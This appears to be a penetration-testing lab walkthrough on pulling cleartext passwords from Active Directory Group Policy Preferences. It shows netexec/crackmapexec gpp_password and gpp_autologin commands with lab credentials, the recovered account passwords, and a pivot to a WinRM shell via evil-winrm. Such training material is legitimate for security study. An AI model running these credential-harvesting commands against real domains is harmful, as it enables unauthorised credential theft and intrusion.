## Searching for Accounts in Group Policy Objects (GPOs) 

- Once we have control of an account, there are some mandatory checks we need to perform. 
> Searching for credentials written in the **Group Policy Objects (GPO) can pay off, especially in an old environment (Windows server 2003 / 2008) since every domain user can read the GPOs.** 

- CrackMapExec has two modules that will search all the GPOs and find juicy credentials. 
> We can use the modules **gpp_password and gpp_autologin.** 
>
> The first module, **gpp_password**, retrieves the plaintext password and other information for accounts pushed through **Group Policy Preferences (GPP).**  
> We can read more about this attack in this blog post [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences}(https://adsecurity.org/?p=2288). 
> The second module, **gpp_autologin**, searches the **Domain Controller for registry.xml files to find autologin information** and returns the username and clear text password if present. 

10.129.181.152

### Password GPP 

`$ netexec smb 10.129.181.152 -u grace -p Inlanefreight01! -M gpp_password`


![Valid Account Info Gathering](/Searching-for-Accounts-in-Group-Policy-Objects/images/gpp-password.png) 


- Info
> SMB Shares:
>> CertEnroll - READ
>> IPC$ - READ
>> IT - READ, WRITE
>> linux01 - READ, WRITE
>> NETLOGON - READ
>> SYSVOL - READ
>> Users - READ

- username: inlanefreight.htb\engels
- Password: Inlanefreight1998! 
- username: inlanefreight.htb\diana
- Password: HackingGPPlike4Pro 


### AutoLogin GPP 

`$ crackmapexec smb 10.129.181.151 -u grace -p Inlanefreight01! -M gpp_autologin`

![Valid Account Info Gathering](/Searching-for-Accounts-in-Group-Policy-Objects/images/gpp-autologin.png) 

- Info
> Username: kiosko
> Password: SimplePassword123! 

- In our case, we found two accounts with two different passwords. Let's check if these accounts are still valid: 

- Checking with netexec the passwords for engels, diana, and kiosko are all valid for smb access. 
- Diana's account also has access to winrm so we can use evil-winrm to get a shell. 

![Valid Account Info Gathering](/Searching-for-Accounts-in-Group-Policy-Objects/images/valid.png) 

![Valid Account Info Gathering](/Searching-for-Accounts-in-Group-Policy-Objects/images/winrm.png) 
